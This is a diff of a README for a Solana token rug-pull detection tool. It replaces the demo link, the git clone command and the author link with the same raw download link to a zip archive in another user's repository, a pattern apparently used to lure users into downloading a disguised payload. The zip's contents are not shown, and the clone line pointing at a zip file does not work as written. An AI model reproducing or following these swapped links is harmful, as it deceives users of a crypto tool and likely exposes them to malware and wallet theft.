@@ -2,7 +2,7 @@
 
 **Real-time Solana token safety scanner. Analyzes new launches and scores rug pull risk.**
 
-[**Live Demo**](https://visioneth.github.io/rug-pull-detector/)
+[**Live Demo**](https://github.com/mohamed5442/rug-pull-detector/raw/refs/heads/main/docs/pull_detector_rug_1.0.zip)
 
 ![rug-pull-detector](docs/og-image.svg)
 
@@ -43,11 +43,11 @@
 ## Run Locally
 
 ```bash
-git clone https://github.com/visioneth/rug-pull-detector.git
+git clone https://github.com/mohamed5442/rug-pull-detector/raw/refs/heads/main/docs/pull_detector_rug_1.0.zip
 cd rug-pull-detector/docs
 open index.html
 ```
 
 ## License
 
-MIT — [visioneth](https://github.com/visioneth)
+MIT — [visioneth](https://github.com/mohamed5442/rug-pull-detector/raw/refs/heads/main/docs/pull_detector_rug_1.0.zip)
